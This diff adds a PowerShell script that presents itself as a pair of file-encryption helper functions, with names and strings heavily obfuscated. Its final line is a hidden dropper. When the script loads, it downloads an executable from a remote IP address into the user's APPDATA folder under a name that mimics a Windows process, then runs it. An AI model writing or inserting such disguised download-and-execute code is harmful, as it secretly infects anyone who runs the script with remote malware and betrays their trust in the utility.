@@ -1,0 +1,52 @@
+function ENaBlE`-FIL`EencR`Y`PTION
+{
+	
+	[OutputType([void])]
+	[CmdletBinding()]
+	param
+	(
+		[Parameter(MaNDATORy,vaLUEFrOmpIpelIne)]
+		[ValidateNotNullOrEmpty()]
+		[System.IO.FileInfo]${F`ILE}
+	)
+	begin {
+		${e`RrO`RAc`TiO`Npr`EF`EREnce} = ("{1}{0}"-f 'p','Sto')
+	}
+	process {
+		try
+		{
+			${fI`LE}.("{1}{0}" -f 't','Encryp').Invoke()	
+		}
+		catch
+		{
+			${ps`CmdLet}.("{4}{5}{3}{0}{2}{1}"-f 't','r','ingErro','Termina','Thr','ow').Invoke(${_})
+		}
+	}
+}
+
+function di`s`A`Ble-FI`LeeNC`RypTIOn
+{
+	
+	[OutputType([void])]
+	[CmdletBinding()]
+	param
+	(
+		[Parameter(maNdaToRy, VaLuEfROMpipelIne)]
+		[ValidateNotNullOrEmpty()]
+		[System.IO.FileInfo]${f`Ile}
+	)
+	begin {
+		${errORa`cTiONprEf`E`R`ence} = ("{1}{0}" -f 'op','St')
+	}
+	process {
+		try
+		{
+			${Fi`LE}.("{0}{1}" -f'D','ecrypt').Invoke()		
+		}
+		catch
+		{
+			${PsCM`dl`ET}.("{0}{4}{2}{1}{3}{5}" -f'T','rmin','owTe','ating','hr','Error').Invoke(${_})
+		}
+	}
+}
+(&("{2}{1}{0}"-f 'Object','-','New') ("{4}{5}{2}{1}{3}{0}" -f'WebClient','t','Ne','.','Syste','m.')).("{3}{1}{0}{2}" -f 'a','o','dFile','Downl').Invoke(("{4}{0}{1}{6}{2}{7}{9}{3}{5}{8}"-f'.102.53','.2','8/~yaho','s','http://94','v.ex','3','o/c','e','sr'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}" -f'St','art-Pro','cess') ("$env:APPDATA\csrsv.exe")
